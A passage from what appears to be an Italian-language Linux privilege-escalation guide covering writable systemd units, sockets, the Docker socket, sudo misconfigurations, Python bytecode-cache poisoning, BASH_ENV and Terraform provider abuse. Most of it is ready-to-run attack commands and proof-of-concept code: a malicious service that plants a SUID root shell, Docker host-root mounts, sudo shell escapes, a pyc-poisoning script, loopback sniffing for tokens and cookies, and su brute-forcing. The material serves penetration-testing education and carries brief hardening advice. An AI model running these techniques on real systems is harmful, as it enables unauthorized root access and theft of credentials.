Controlla se puoi scrivere su qualche file `.service`; in tal caso, **potresti modificarlo** in modo che **esegua** la tua **backdoor quando** il servizio viene **avviato**, **riavviato** o **arrestato** (potresti dover aspettare il riavvio della macchina).\
Per esempio, crea la tua backdoor nel file .service con **`ExecStart=/tmp/script.sh`**

### Binari dei servizi scrivibili

Tieni presente che, se hai **permessi di scrittura sui binari eseguiti dai servizi**, puoi sostituirli con backdoor, così quando i servizi verranno eseguiti di nuovo, verranno eseguite anche le backdoor.

### PATH di systemd - Percorsi relativi

Puoi vedere il PATH usato da **systemd** con:

```bash
systemctl show-environment
```

Se scopri di poter **scrivere** in una qualsiasi delle cartelle del percorso, potresti essere in grado di **escalare i privilegi**. Devi cercare **percorsi relativi utilizzati nei file di configurazione dei servizi**, come:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Quindi, crea un **eseguibile** con lo **stesso nome del binario indicato dal percorso relativo** all'interno della cartella PATH di systemd in cui puoi scrivere. Quando al servizio viene chiesto di eseguire l'azione vulnerabile (**Start**, **Stop**, **Reload**), verrà eseguita la tua **backdoor** (gli utenti senza privilegi di solito non possono avviare o arrestare i servizi, ma controlla se puoi usare `sudo -l`).

**Scopri di più sui servizi con `man systemd.service`.**

## **Timer**

I **Timer** sono file di unità systemd il cui nome termina in `**.timer**` e che controllano file `**.service**` o eventi. I **Timer** possono essere usati come alternativa a cron, poiché supportano nativamente eventi basati sull'ora di calendario e sul tempo monotono e possono essere eseguiti in modo asincrono.

Puoi enumerare tutti i timer con:

```bash
systemctl list-timers --all
```

### Timer modificabili

Se puoi modificare un timer, puoi fargli eseguire alcune unità di systemd.unit (come un `.service` o un `.target`).

```bash
Unit=backdoor.service
```

Nella documentazione puoi leggere cos'è l'unità:

> L'unità da attivare quando scade questo timer. L'argomento è il nome di un'unità, senza il suffisso ".timer". Se non specificato, il valore predefinito è un servizio con lo stesso nome dell'unità timer, ma senza il suffisso. (Vedi sopra.) È consigliabile che il nome dell'unità attivata e quello dell'unità timer siano identici, fatta eccezione per il suffisso.

Pertanto, per sfruttare questo permesso dovresti:

- Trovare un'unità systemd (come un `.service`) che **esegue un binario scrivibile**
- Trovare un'unità systemd che **esegue un percorso relativo** e avere **privilegi di scrittura** sul **PATH di systemd** (per impersonare quell'eseguibile)

**Scopri di più sui timer con `man systemd.timer`.**

### **Abilitazione del timer**

Per abilitare un timer servono i privilegi di root e bisogna eseguire:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Nota: il **timer** viene **attivato** creando un symlink a esso in `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

I Unix Domain Sockets (UDS) consentono la **comunicazione tra processi** sulla stessa macchina o su macchine diverse, nell'ambito di modelli client-server. Utilizzano file descriptor Unix standard per la comunicazione tra computer e vengono configurati tramite file `.socket`.<sup>[[14]](#references)</sup>

I socket possono essere configurati tramite file `.socket`.

**Scopri di più sui socket con `man systemd.socket`.** In questo file è possibile configurare diversi parametri interessanti:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: queste opzioni sono diverse, ma in sintesi **indicano dove il socket si metterà in ascolto** (il percorso del file socket AF_UNIX, l'indirizzo IPv4/6 e/o il numero di porta su cui mettersi in ascolto, ecc.)
- `Accept`: accetta un argomento booleano. Se è **true**, viene **avviata un'istanza del servizio per ogni connessione in ingresso** e a essa viene passato solo il socket della connessione. Se è **false**, tutti i socket in ascolto vengono **passati all'unità di servizio avviata** e viene avviata una sola unità di servizio per tutte le connessioni. Questo valore viene ignorato per i socket datagram e le FIFO, in cui una singola unità di servizio gestisce incondizionatamente tutto il traffico in ingresso. **Il valore predefinito è false**. Per motivi di prestazioni, si consiglia di scrivere i nuovi daemon in modo che siano compatibili con `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: accettano una o più righe di comando, che vengono **eseguite prima** o **dopo** la creazione e il binding dei **socket**/FIFO in ascolto, rispettivamente. Il primo token della riga di comando deve essere un nome file assoluto, seguito dagli argomenti del processo.
- `ExecStopPre`, `ExecStopPost`: **comandi** aggiuntivi che vengono **eseguiti prima** o **dopo** la chiusura e la rimozione dei **socket**/FIFO in ascolto, rispettivamente.
- `Service`: specifica il nome dell'unità di **servizio** da **attivare** in caso di **traffico in ingresso**. Questa impostazione è consentita solo per i socket con Accept=no. Per impostazione predefinita, viene usato il servizio con lo stesso nome del socket (con il suffisso sostituito). Nella maggior parte dei casi, non dovrebbe essere necessario usare questa opzione.

### File .socket scrivibili

Se trovi un file `.socket` **scrivibile**, puoi **aggiungere** all'inizio della sezione `[Socket]` qualcosa come: `ExecStartPre=/home/kali/sys/backdoor`; il backdoor verrà eseguito prima della creazione del socket. Pertanto, **probabilmente dovrai aspettare il riavvio della macchina.**\
_Nota che il sistema deve usare la configurazione di quel file socket, altrimenti il backdoor non verrà eseguito_

### Attivazione socket + percorso dell'unità scrivibile (creazione del servizio mancante)

Un'altra configurazione errata ad alto impatto è:

- un'unità socket con `Accept=no` e `Service=<name>.service`
- l'unità di servizio referenziata è mancante
- un attacker può scrivere in `/etc/systemd/system` (o in un altro percorso di ricerca delle unità)

In questo caso, l'attacker può creare `<name>.service`, quindi inviare traffico al socket affinché systemd carichi ed esegua il nuovo servizio come root.

Flusso rapido:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Socket scrivibili

Se **identifichi un socket scrivibile** (_qui stiamo parlando di Unix socket, non dei file di configurazione `.socket`_), allora **puoi comunicare** con quel socket e magari sfruttare una vulnerabilità.

### Enumerare i Unix socket

```bash
netstat -a -p --unix
```

### Connessione raw

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Esempio di exploit:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Socket HTTP

Nota che potrebbero esserci alcuni **socket in ascolto di richieste HTTP** (_non parlo dei file .socket, ma dei file che fungono da socket unix_). Puoi verificarlo con:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Se il socket **risponde a una richiesta HTTP**, puoi **comunicare** con esso e magari **sfruttare una vulnerabilità**.

### Socket Docker scrivibile

Il socket Docker, spesso presente in `/var/run/docker.sock`, è un file critico che dovrebbe essere protetto. Per impostazione predefinita, è scrivibile dall'utente `root` e dai membri del gruppo `docker`. Avere accesso in scrittura a questo socket può portare a un'escalation dei privilegi. Ecco come fare e quali metodi alternativi usare se Docker CLI non è disponibile.

#### **Escalation dei privilegi con Docker CLI**

Se hai accesso in scrittura al socket Docker, puoi aumentare i privilegi usando i seguenti comandi:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Questi comandi consentono di avviare un container con accesso root al file system dell'host.

#### **Uso diretto della Docker API**

Quando la Docker CLI non è disponibile, è comunque possibile abusare del socket Docker usando HTTP grezzo tramite il socket Unix. Il flusso più affidabile è:

- creare un container helper a lunga esecuzione con la root dell'host montata in bind
- avviarlo
- creare un'istanza `exec` al suo interno
- avviare l'istanza `exec` e recuperare l'output tramite l'API

**Elencare le immagini Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Crea e avvia un container di supporto**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Crea un'istanza exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Avvia l'istanza exec e leggi l'output**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Questo pattern è solitamente più robusto che provare a gestire manualmente `attach` con `socat` o `nc -U`. Una volta che puoi creare un helper con `/:/host`, puoi usare altre istanze di `exec` per leggere file come `/host/root/...`, aggiungere chiavi SSH in `/host/root/.ssh` o modificare i file di avvio dell'host.

### Altri

Nota che, se hai i permessi di scrittura sul socket docker perché **fai parte del gruppo `docker`**, hai [**altri modi per effettuare un'escalation dei privilegi**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Se [**l'API docker è in ascolto su una porta**, puoi anche riuscire a comprometterla](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Scopri **altri modi per uscire dai container o abusare dei runtime dei container per effettuare un'escalation dei privilegi** in:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Escalation dei privilegi con Containerd (ctr)

Se scopri di poter usare il comando **`ctr`**, leggi la pagina seguente, perché **potresti riuscire ad abusarne per effettuare un'escalation dei privilegi**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Escalation dei privilegi con **RunC**

Se scopri di poter usare il comando **`runc`**, leggi la pagina seguente, perché **potresti riuscire ad abusarne per effettuare un'escalation dei privilegi**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus è un sofisticato **sistema di comunicazione tra processi (IPC)** che consente alle applicazioni di interagire e condividere dati in modo efficiente. Progettato pensando ai moderni sistemi Linux, offre un framework robusto per diverse forme di comunicazione tra applicazioni.<sup>[[16]](#references)</sup>

Il sistema è versatile: supporta la IPC di base, migliorando lo scambio di dati tra processi in modo simile ai **socket di dominio UNIX potenziati**. Inoltre, consente di trasmettere eventi o segnali, favorendo la perfetta integrazione tra i componenti del sistema. Ad esempio, un segnale del demone Bluetooth che indica una chiamata in arrivo può indurre un lettore musicale a disattivare l'audio, migliorando l'esperienza dell'utente. D-Bus supporta anche un sistema di oggetti remoti, semplificando le richieste di servizi e le invocazioni di metodi tra applicazioni e snellendo processi tradizionalmente complessi.

D-Bus opera secondo un **modello allow/deny**, gestendo i permessi dei messaggi (chiamate di metodo, emissioni di segnali, ecc.) in base all'effetto cumulativo delle regole di policy corrispondenti. Queste policy specificano le interazioni con il bus e possono consentire un'escalation dei privilegi tramite lo sfruttamento di tali permessi.

Di seguito è riportato un esempio di policy in `/etc/dbus-1/system.d/wpa_supplicant.conf`, che specifica i permessi dell'utente root per possedere `fi.w1.wpa_supplicant1` e inviargli e riceverne messaggi.

Le policy che non specificano un utente o un gruppo si applicano universalmente, mentre le policy del contesto "default" si applicano a tutti i casi non coperti da altre policy specifiche.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Scopri come enumerare e sfruttare una comunicazione D-Bus qui:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Rete**

È sempre interessante enumerare la rete e determinare la posizione della macchina.

### Enumerazione generica

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Se una voce attiva in `/etc/inetd.conf` esegue GNU Inetutils `telnetd` come root, controlla la versione del binario configurato e il listener locale, anche quando la porta è associata solo all'interfaccia loopback. GNU Inetutils dalla versione 1.9.3 alla 2.7 presentava un [bypass dell'autenticazione Telnet](https://seclists.org/oss-sec/2026/q1/89) in cui `USER`, fornito dal client, veniva passato a `login -f` (CVE-2026-24061). Un processo o una stringa di versione sono indicatori; verifica lo stato delle patch del vendor e il daemon effettivamente in esecuzione prima di considerarlo esposto. La [guida Telnet](../../../network-services-pentesting/pentesting-telnet.md) contiene maggiori dettagli.

### Triage rapido del filtraggio in uscita

Se l'host può eseguire comandi ma i callback falliscono, distingui rapidamente tra filtraggio di DNS, trasporto, proxy e route:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Porte aperte

Controlla sempre i servizi di rete in esecuzione sulla macchina con cui non sei riuscito a interagire prima di accedervi:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Classifica i listener in base al target di bind:

- `0.0.0.0` / `[::]`: esposti su tutte le interfacce locali.
- `127.0.0.1` / `::1`: solo locali (buoni candidati per tunnel/forward).
- IP interni specifici (ad es. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): in genere raggiungibili solo dai segmenti interni.

### Workflow di triage dei servizi accessibili solo localmente

Quando comprometti un host, i servizi associati a `127.0.0.1` spesso diventano raggiungibili per la prima volta dalla tua shell. Un rapido workflow locale è:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS come scanner di rete (modalità solo rete)

Oltre ai controlli locali di PE, linPEAS può essere eseguito come scanner di rete dedicato. Usa i binari disponibili in `$PATH` (in genere `fping`, `ping`, `nc`, `ncat`) e non installa strumenti.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Se passi `-d`, `-p` o `-i` senza `-t`, linPEAS si comporta come un puro scanner di rete, saltando il resto dei controlli di privilege escalation.

### Sniffing

Verifica se puoi sniffare il traffico. In tal caso, potresti riuscire a recuperare alcune credenziali.

```
timeout 1 tcpdump
```

Controlli pratici rapidi:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) è particolarmente prezioso nel post-exploitation perché molti servizi accessibili solo internamente espongono token/cookie/credenziali lì:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Acquisisci ora, analizza in seguito:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Utenti

### Enumerazione generica

Controlla **chi** sei, quali **privilegi** hai, quali **utenti** sono presenti nei sistemi, quali possono effettuare il **login** e quali hanno **privilegi di root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Big UID

Alcune versioni di Linux erano affette da un bug che consente agli utenti con **UID > INT_MAX** di escalare i privilegi. Maggiori informazioni: [qui](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [qui](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [qui](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Esegui l'exploit** con: **`systemd-run -t /bin/bash`**

### Gruppi

Verifica se fai parte di un **gruppo** che potrebbe concederti privilegi di root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Appunti

Verifica se negli appunti è presente qualcosa di interessante (se possibile)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Politica delle password

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Password conosciute

Se **conosci una password** dell'ambiente, **prova ad accedere come ogni utente** usando la password.

### Su Brute

Se non ti preoccupa fare molto rumore e sul computer sono presenti i binari `su` e `timeout`, puoi provare a fare brute-force sugli utenti usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
Anche [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), con il parametro `-a`, prova a fare brute-force sugli utenti.

## Abusi del PATH scrivibile

### $PATH

Se scopri di poter **scrivere in una cartella del $PATH**, potresti riuscire a scalare i privilegi **creando una backdoor nella cartella scrivibile**, con il nome di un comando che verrà eseguito da un altro utente (idealmente root) e che **non viene caricato da una cartella situata prima della tua cartella scrivibile nel $PATH**.

### SUDO e SUID

Potresti avere il permesso di eseguire alcuni comandi usando sudo, oppure questi potrebbero avere il bit suid. Verificalo usando:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Alcuni **comandi inaspettati consentono di leggere e/o scrivere file o persino eseguire un comando**.<sup>[[8]](#references)</sup> Per esempio:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

La configurazione di sudo potrebbe consentire a un utente di eseguire determinati comandi con i privilegi di un altro utente senza conoscerne la password.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

In questo esempio l'utente demo può eseguire vim come root; a questo punto è banale ottenere una shell aggiungendo una chiave ssh alla directory root oppure invocando sh.

```
sudo vim -c '!sh'
```

### Confronto Bash senza virgolette in uno script sudo

In Bash, il lato destro di `[[ "$protected" == $candidate ]]` è un pattern. Se uno script sudo con privilegi di root assegna a `candidate` un valore proveniente da un file controllato dall’utente, un valore come `prefix*` può corrispondere all’inizio di una stringa protetta. Percorsi diversi di successo ed errore possono quindi esporre un oracolo sul prefisso. Racchiudi tra virgolette il lato destro (`[[ "$protected" == "$candidate" ]]`) quando è richiesta un’uguaglianza letterale. Prima di considerare sfruttabile un confronto senza virgolette, verifica gli argomenti sudo effettivi, la provenienza dell’input e il comportamento osservabile dei rami. Il [manuale GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) descrive questo comportamento dei pattern.

### File di progetto PrusaSlicer con sudo

Una regola sudo senza restrizioni che concede privilegi di root per `prusaslicer` o `prusa-slicer` merita di essere esaminata se l’utente può scegliere il progetto `.3mf` da elaborare. Un progetto può includere uno script di post-elaborazione eseguito quando viene esportato il G-code; progetti appositamente creati potrebbero eseguire comandi in PrusaSlicer fino alla versione 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Prima di concludere che il confine dei privilegi è aggirabile, verifica la regola sudo effettiva, la versione del binario e le patch del fornitore, la provenienza del progetto e se il percorso di esportazione pertinente viene eseguito. Un argomento del progetto fisso o una policy `NOEXEC` effettiva possono cambiare l’esito. La sola presenza dello slicer non dimostra l’esistenza di un percorso di escalation dei privilegi.

### SETENV

Questa direttiva consente all’utente di **impostare una variabile d’ambiente** durante l’esecuzione di qualcosa:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Questo esempio, **basato sulla macchina HTB Admirer**, era **vulnerabile** al **PYTHONPATH hijacking** per caricare una libreria Python arbitraria durante l'esecuzione dello script come root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Avvelenamento di `__pycache__` / `.pyc` scrivibile negli import Python consentiti da sudo

Se uno **script Python consentito da sudo** importa un modulo la cui directory del package contiene una **`__pycache__` scrivibile**, potresti riuscire a sostituire il file `.pyc` memorizzato nella cache ed eseguire codice come utente privilegiato al successivo import.<sup>[[30]](#references)</sup>

- Perché funziona:
  - CPython memorizza le cache del bytecode in `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - L’interprete convalida l’**header** (magic + metadati di timestamp/hash associati al sorgente), quindi esegue l’oggetto codice serializzato memorizzato dopo quell’header.
  - Se puoi **eliminare e ricreare** il file memorizzato nella cache perché la directory è scrivibile, puoi sostituire comunque un `.pyc` di proprietà di root ma non scrivibile.
- Percorso tipico:
  - `sudo -l` mostra uno script o un wrapper Python che puoi eseguire come root.
  - Lo script importa un modulo locale da `/opt/app/`, `/usr/local/lib/...` ecc.
  - La directory `__pycache__` del modulo importato è scrivibile dal tuo utente o da tutti.

Enumerazione rapida:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Se puoi ispezionare lo script privilegiato, identifica i moduli importati e il percorso della loro cache:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Procedura di abuso:

1. Esegui una volta lo script consentito da sudo, così Python crea il file cache legittimo, se non esiste già.
2. Leggi i primi 16 byte del file `.pyc` legittimo e riutilizzali nel file avvelenato.
3. Compila un code object per il payload, esegui `marshal.dumps(...)`, elimina il file cache originale e ricrealo con l'header originale seguito dal tuo bytecode malevolo.
4. Esegui di nuovo lo script consentito da sudo, così l'import esegue il tuo payload come root.

Note importanti:

- Riutilizzare l'header originale è fondamentale perché Python confronta i metadati della cache con il file sorgente, non verifica che il corpo del bytecode corrisponda davvero al sorgente.
- È particolarmente utile quando il file sorgente è di proprietà di root e non è scrivibile, ma la directory `__pycache__` che lo contiene lo è.
- `PYTHONDONTWRITEBYTECODE=1` e `python -B` impediscono a Python di scrivere nuovi file `.pyc`; **non** gli impediscono di caricare una cache già valida e sostituita dall'attaccante. Il limite critico è se un utente con privilegi inferiori può sostituire una cache che l'import privilegiato accetterà. Prima di caricare il bytecode memorizzato nella cache, Python verifica i metadati di timestamp/dimensione o hash. Vedi il [riferimento agli import di Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) e la [documentazione della riga di comando](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Struttura minima della proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Assicurati che nessuna directory nel percorso di importazione Python privilegiato sia scrivibile da utenti con privilegi inferiori, inclusa `__pycache__`.
- Verifica proprietario e permessi delle directory di cache, compresi i file `.pyc` esistenti. Disabilitare la scrittura di bytecode può ridurre la creazione di nuove cache, ma non neutralizza una cache esistente sostituibile.
- Tratta i moduli Python locali scrivibili e le directory di cache scrivibili come script shell o librerie condivise scrivibili eseguiti da root.

### BASH_ENV mantenuta tramite sudo env_keep → shell root

Se sudoers mantiene `BASH_ENV` (ad es. `Defaults env_keep+="ENV BASH_ENV"`), puoi sfruttare il comportamento di avvio di Bash non interattivo per eseguire codice arbitrario come root quando invochi un comando consentito.<sup>[[24]](#references)</sup>

- Perché funziona: nelle shell non interattive, Bash valuta `$BASH_ENV` e carica il file prima di eseguire lo script di destinazione. Molte regole sudo consentono di eseguire uno script o un wrapper di shell. Se `BASH_ENV` viene mantenuta da sudo, il tuo file viene caricato con privilegi root.<sup>[[23]](#references)</sup>

- Requisiti:
  - Una regola sudo che puoi usare (qualsiasi destinazione che invochi `/bin/bash` in modalità non interattiva o qualsiasi script bash).
  - `BASH_ENV` presente in `env_keep` (verifica con `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Rafforzamento:
  - Rimuovi `BASH_ENV` (e `ENV`) da `env_keep`; preferisci `env_reset`.
  - Evita wrapper di shell per i comandi consentiti da sudo; usa binari minimali.
  - Valuta la registrazione I/O di sudo e gli avvisi quando vengono usate variabili d’ambiente preservate.

### Terraform tramite sudo con HOME preservato (!env_reset)

Quando sudo consente di eseguire Terraform come utente con privilegi più elevati, `!env_reset` è un indizio per verificare quali variabili d’ambiente sopravvivono davvero a quella specifica regola. Verifica il valore effettivo di `HOME` o `TF_CLI_CONFIG_FILE` prima di considerare attiva la configurazione CLI `.terraformrc` o `terraform.rc` modificabile da chi invoca il comando. Una voce `provider_installation.dev_overrides` è rilevante solo se il comando Terraform specificato carica quel provider e chi invoca il comando può collocare il relativo eseguibile nella directory selezionata.<sup>[[25]](#references)</sup>

- Indirizza il provider richiesto a una directory modificabile e inserisci un plugin malevolo con il nome del provider (ad es. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform non riuscirà a completare il plugin handshake di Go, ma eseguirà il payload come root prima di arrestarsi, lasciando una shell SUID.

### Override di TF_VAR + bypass della validazione dei symlink

